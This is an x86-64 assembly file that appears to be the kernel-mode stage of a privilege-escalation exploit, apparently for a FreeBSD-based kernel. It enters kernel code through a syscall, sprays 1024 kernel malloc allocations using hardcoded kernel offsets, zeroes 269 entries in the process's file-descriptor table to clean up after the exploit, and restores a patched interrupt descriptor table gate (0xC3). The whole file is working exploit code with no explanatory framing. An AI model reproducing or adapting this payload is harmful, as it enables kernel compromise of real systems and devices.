use64

%define CLOSEUP_COUNT 269

%define SD_RESTORE_FLAG (CLOSEUP_COUNT*4 + 4)   ; 1080
%define SD_IDT_BASE     (CLOSEUP_COUNT*4 + 12)  ; 1088
%define SD_GATE_LO      (CLOSEUP_COUNT*4 + 20)  ; 1096
%define SD_GATE_HI      (CLOSEUP_COUNT*4 + 28)  ; 1104

entry:
    push rsi
    push rdi
    mov rsi, rsp
    lea rdi, [rel kernel_entry]
    mov eax, 11
    syscall
    pop rdi
    pop rsi
    ret

kernel_entry:
    push rbx                       ; preserve rbx
    mov rsi, [rsi+8]               ; rsi = args pointer
    mov rbx, [rsi]                 ; rbx = args[0] = closeup_fds = sd.fds = &sd
    push qword [rsi]               ; closeup_fds
    push qword [rsi+8]             ; kernel_base

    mov rcx, 1024
.malloc_loop:
    push rcx
    mov rax, [rsp+8]               ; kernel_base
    mov edi, 0xf8
    lea rsi, [rax+0x1540eb0]       ; M_TEMP
    mov edx, 2
    add rax, 0xd7a0                ; malloc
    call rax
    pop rcx
    loop .malloc_loop

    pop rdi                        ; kernel_base
    pop rsi                        ; closeup_fds

    ; ---- fd wipe ----
    test rsi, rsi
    jz .skip_closeup
    mov rax, [gs:0]
    mov rax, [rax+8]
    mov rax, [rax+0x48]
    mov rdx, [rax]
    mov rcx, CLOSEUP_COUNT
    cld
.closeup_loop:
    lodsd
    mov qword [rdx+8*rax], 0
    loop .closeup_loop
.skip_closeup:

    ; ---- gate 0xC3 restoration ----
    test rbx, rbx
    jz .done
    mov rax, [rbx + SD_RESTORE_FLAG]
    test rax, rax
    jz .done

    mov rdi, [rbx + SD_IDT_BASE]
    mov rax, [rbx + SD_GATE_LO]
    mov rdx, [rbx + SD_GATE_HI]
    test rdi, rdi
    jz .done
    mov [rdi + 0xc30], rax
    mov [rdi + 0xc38], rdx

.done:
    pop rbx
    xor eax, eax
    ret
align 8
